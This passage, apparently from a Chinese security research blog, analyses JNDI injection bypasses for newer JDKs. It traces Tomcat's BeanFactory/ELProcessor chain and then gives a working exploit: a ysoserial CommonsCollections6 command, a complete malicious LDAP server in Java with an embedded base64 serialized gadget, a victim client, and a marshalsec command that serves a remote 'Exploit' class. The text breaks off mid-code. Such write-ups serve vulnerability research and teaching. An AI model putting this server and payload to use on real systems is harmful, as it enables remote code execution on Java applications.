<p><code>RegistryContext.lookup</code>对RMI registry发请求,反序列获取到<code>ReferenceWrapper_Stub</code>，然后把反序列得到的<code>ReferenceWrapper_Stub</code>传给<code>decodeObject()</code></p>
<p><img decoding="async" loading="lazy" alt="image-20210819152602319" src="/assets/images/image-20210819152602319-81912df5ab9b8aac7d6b43b8eee012d4.png" width="3582" height="1946" class="img_ev3q"></p>
<p>跟进<code>decodeObject</code>，首先给获取到的var1 <code>ReferenceWrapper_Stub</code>调用<code>getReference()</code>方法，<code>getReference</code>方法通过获取<code>ReferenceWrapper_Stub</code>的<code>ref</code>属性然后发请求, 反序列请求结果得到真正绑定到RMI  Registry上的对象(<code>ResourceRef</code>), 然后传给<code>NamingManager.getObjectInstance()</code>方法。</p>
<p><img decoding="async" loading="lazy" alt="image-20210819152959325" src="/assets/images/image-20210819152959325-26fc81e9303f0dd5d98b0f563b0eaffd.png" width="3582" height="2010" class="img_ev3q"></p>
<p>首先类型转换将object转换为<code>Reference对象</code></p>
<p><img decoding="async" loading="lazy" alt="image-20210819153423470" src="/assets/images/image-20210819153423470-da7b4191e444dbd7cd44c847f2893885.png" width="2930" height="1964" class="img_ev3q"></p>
<p>然后<code>ref.getFactoryClassName()</code> 获取<code>FactoryClassName</code>，返回的是Reference对象的<code>classFactory</code>属性，然后传递到<code>getObjectFactoryFromReference</code>中，然后<code>loadClass</code>加载我们传入的<code>org.apache.naming.factory.BeanFactory</code>类, 再<code>newInstance</code>实例化该类并将其转换成<code>ObjectFactory</code>类型。</p>
<p><img decoding="async" loading="lazy" alt="image-20210819160412148" src="/assets/images/image-20210819160412148-9e2ec21e39d9fe8023a564415452c951.png" width="3582" height="2100" class="img_ev3q"></p>
<p>然后直接调用<code>ObjectFactory接口</code>实现类实例的<code>getObjectInstance()</code>函数，这里是<code>BeanFactory</code>类实例的<code>getObjectInstance()</code>函数</p>
<p><img decoding="async" loading="lazy" alt="image-20210819161424244" src="/assets/images/image-20210819161424244-4506fd8ded7b231a7d10a9878363dcfd.png" width="3582" height="2126" class="img_ev3q"></p>
<p>跟进<code>BeanFactory.getObjectInstance</code>，会判断obj参数是否是ResourceRef类实例，是的话代码才会往下走，<strong>这就是为什么我们在恶意RMI服务端中构造Reference类实例的时候必须要用Reference类的子类ResourceRef类来创建实例</strong></p>
<p><img decoding="async" loading="lazy" alt="image-20210819161647722" src="/assets/images/image-20210819161647722-8c58c707249fb2af5403a1da23588e2d.png" width="3582" height="2050" class="img_ev3q"></p>
<p>接着获取Bean类为<code>javax.el.ELProcessor</code>后，实例化该类并获取其中的forceString类型的内容，其值是我们构造的<code>x=eval</code>内容：</p>
<p><img decoding="async" loading="lazy" alt="image-20210819162159006" src="/assets/images/image-20210819162159006-67beb5e71e6c072d77e0ea9d8cbaa0c9.png" width="3584" height="2240" class="img_ev3q"></p>
<p>继续往下调试可以看到，查找forceString的内容中是否存在”=”号，不存在的话就调用属性的默认setter方法，存在的话就取键值、其中键是属性名而对应的值是其指定的setter方法。如此，**之前设置的forceString的值就可以强制将x属性的setter方法转换为调用我们指定的eval()方法了，这是BeanFactory类能进行利用的关键点！**之后，就是获取<code>beanClass</code>即<code>javax.el.ELProcessor</code>类的<code>eval()</code>方法并和x属性一同缓存到forced这个HashMap中</p>
<p><img decoding="async" loading="lazy" alt="image-20210819162511210" src="/assets/images/image-20210819162511210-56b74287a51d6d11c8553dbe2db0c25a.png" width="3584" height="2240" class="img_ev3q"></p>
<p>接着是多个<code>do  while</code>语句来遍历获取<code>ResourceRef</code>类实例addr属性的元素，当获取到addrType为x的元素时退出当前所有循环，然后调用<code>getContent()</code>函数来获取x属性对应的contents即恶意表达式。这里就是恶意RMI服务端中ResourceRef类实例添加的第二个元素</p>
<p><img decoding="async" loading="lazy" alt="image-20210819163456939" src="/assets/images/image-20210819163456939-2e57b0b320d1ca20e8f85c804391d9e3.png" width="3584" height="2240" class="img_ev3q"></p>
<p>获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即<code>javax.el.ELProcessor</code>类的<code>eval()</code>方法并赋值给method变量，最后就是通过<code>method.invoke()</code>即反射调用的来执行恶意的EL表达式。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="总结">总结<a href="#总结" class="hash-link" aria-label="总结的直接链接" title="总结的直接链接">​</a></h4>
<ul>
<li>这种方法是从本地ClassPath中寻找可能存在Tomcat相关依赖包来进行触发利用，已知的类是<code>org.apache.naming.factory.BeanFactory</code>；</li>
<li>由于<code>org.apache.naming.factory.BeanFactory</code>类的getObjectInstance()方法会判断是否为ResourceRef类实例，因此在RMI服务端绑定的Reference类实例中必须为Reference类的子类ResourceRef类实例，这里resourceClass选择的也是在Tomcat环境中存在的<code>javax.el.ELProcessor</code>类；</li>
<li>ResourceRef类实例分别添加了两次StringRefAddr类实例元素，第一次是类型为<code>forceString</code>、内容为<code>x=eval</code>的StringRefAddr类实例，这里看<code>org.apache.naming.factory.BeanFactory</code>类的getObjectInstance()方法源码发现，程序会判断是否存在<code>=</code>号，若存在则将<code>x</code>属性的默认setter方法设置为我们<code>eval</code>；第二次是类型为<code>x</code>、内容为恶意表达式的StringRefAddr类实例，这里是跟前面的<code>x</code>属性关联起来，<code>x</code>属性的setter方法是eval()，而现在它的内容为恶意表达式，这样就能串起来调用<code>javax.el.ELProcessor</code>类的eval()函数执行恶意表达式从而达到攻击利用的目的</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="绕过高版本jdk限制利用ldap返回序列化数据触发本地gadget">绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget<a href="#绕过高版本jdk限制利用ldap返回序列化数据触发本地gadget" class="hash-link" aria-label="绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget的直接链接" title="绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget的直接链接">​</a></h3>
<p>LDAP服务端除了支持JNDI Reference这种利用方式外，还支持直接返回一个序列化的对象。<strong>如果Java对象的<code>javaSerializedData属性值</code>不为空，则客户端的<code>obj.decodeObject()</code>方法就会对这个字段的内容进行反序列化</strong>。
如果服务端ClassPath中存在反序列化漏洞多功能利用Gadget如CommonsCollections库，那么就可以结合该Gadget实现反序列化漏洞攻击。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="利用举例-1">利用举例<a href="#利用举例-1" class="hash-link" aria-label="利用举例的直接链接" title="利用举例的直接链接">​</a></h4>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="生成poc">生成POC<a href="#生成poc" class="hash-link" aria-label="生成POC的直接链接" title="生成POC的直接链接">​</a></h5>
<p>假设目标系统中存在着有漏洞的<code>CommonsCollections</code>库，使用ysoserial生成一个CommonsCollections的利用Payload</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-jar</span><span class="token plain"> ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 </span><span class="token string" style="color:#e3116c">&quot;open -na Calculator&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> base64</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="ldap-server">LDAP Server<a href="#ldap-server" class="hash-link" aria-label="LDAP Server的直接链接" title="LDAP Server的直接链接">​</a></h5>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.unboundid.ldap.sdk.Entry;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.unboundid.ldap.sdk.LDAPException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.unboundid.ldap.sdk.LDAPResult;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.unboundid.ldap.sdk.ResultCode;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.unboundid.util.Base64;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.net.ServerSocketFactory;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.net.SocketFactory;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.net.ssl.SSLSocketFactory;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.InetAddress;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.MalformedURLException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.URL;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.text.ParseException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main (String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String url = &quot;http://127.0.0.1:8888/#Exploit&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        int port = 1389;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    &quot;listen&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    InetAddress.getByName(&quot;0.0.0.0&quot;),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    port,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    ServerSocketFactory.getDefault(),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    SocketFactory.getDefault(),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ds.startListening();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        catch ( Exception e ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            e.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private static class OperationInterceptor extends InMemoryOperationInterceptor {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        private URL codebase;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        /**</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public OperationInterceptor ( URL cb ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            this.codebase = cb;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        /**</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         * {@inheritDoc}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public void processSearchResult (InMemoryInterceptedSearchResult result ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String base = result.getRequest().getBaseDN();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Entry e = new Entry(base);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                sendResult(result, base, e);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            catch ( Exception e1 ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                e1.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            String cbstring = this.codebase.toString();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            int refPos = cbstring.indexOf(&#x27;#&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if ( refPos &gt; 0 ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                cbstring = cbstring.substring(0, refPos);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // Payload1: 利用LDAP+Reference Factory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // Payload2: 返回序列化Gadget</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABNvcGVuIC1uYSBDYWxjdWxhdG9ydAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            } catch (ParseException exception) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                exception.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            result.sendSearchEntry(e);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="client-1">Client<a href="#client-1" class="hash-link" aria-label="Client的直接链接" title="Client的直接链接">​</a></h5>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.InitialContext;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.NamingException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Client {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws NamingException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //初始化环境</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        InitialContext init = new InitialContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        init.lookup(&quot;ldap://127.0.0.1:1389/Exploit&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210819165755303" src="/assets/images/image-20210819165755303-a7df82091708b2997a17a1b20b48d9cc.png" width="1776" height="690" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="debug分析-1">Debug分析<a href="#debug分析-1" class="hash-link" aria-label="Debug分析的直接链接" title="Debug分析的直接链接">​</a></h4>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="调用栈">调用栈<a href="#调用栈" class="hash-link" aria-label="调用栈的直接链接" title="调用栈的直接链接">​</a></h5>
<p><img decoding="async" loading="lazy" alt="image-20210819171135332" src="/assets/images/image-20210819171135332-8a0ba42fffc925c5f29b9ecc9393cd92.png" width="1078" height="626" class="img_ev3q"></p>
<p>前面的函数调用链都是不同类<code>lookup()</code>函数之间的调用，<code>com.sun.jndi.ldap.LdapCtx</code>类的<code>c_lookup()</code>函数中会调用到<code>com.sun.jndi.ldap.Obj</code>类的<code>decodeObject()</code>函数进行解码对象的操作。</p>
<p>跟进去，先调用<code>getCodebases()</code>函数从<code>JAVA_ATTRIBUTES</code>中取出索引为4即<code>javaCodeBase</code>的内容，由于本次并没有设置这个属性因此返回null即下面Variables框中的<code>var1(slot_2)</code>变量；然后从<code>JAVA_ATTRIBUTES</code>中取出索引为1即<code>javaSerializedData</code>的内容，这个我们是在恶意LDAP服务端中设置了的、内容就是恶意的Commons-Collections这个Gadget的恶意利用序列化对象字节流，对应的是下面Variables框中的<code>var2  (slot_1)</code>变量；这里<code>var1(slot_2</code>)变量为null，传入<code>getURLClassLoader()</code>函数调用后返回的是<code>AppClassLoader</code>即应用类加载器；再往下就是调用<code>deserializeObject()</code>函数来反序列化<code>javaSerializedData</code>的对象字节码</p>
<p><img decoding="async" loading="lazy" alt="image-20210819171349431" src="/assets/images/image-20210819171349431-c6bd6fd7b28a15d8d0e4c4d3a798dd12.png" width="3584" height="2240" class="img_ev3q"></p>
<p>其中，静态变量<code>JAVA_ATTRIBUTES</code>的内容如下：</p>
<p><img decoding="async" loading="lazy" alt="image-20210819171719561" src="/assets/images/image-20210819171719561-94f5928d6429ce72726bee75f332a2e6.png" width="3582" height="1572" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="建议">建议<a href="#建议" class="hash-link" aria-label="建议的直接链接" title="建议的直接链接">​</a></h4>
<p>实战中可以使用marshalsec方便的启动一个LDAP/RMI Ref Server：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-cp</span><span class="token plain"> target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LDAP</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">RMI</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">RefServer </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">codebase</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token comment" style="color:#999988;font-style:italic">#&lt;class&gt; [&lt;port&gt;]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Example:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-cp</span><span class="token plain"> target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://8.8.8.8:8090/</span><span class="token comment" style="color:#999988;font-style:italic">#Exploit 8088</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 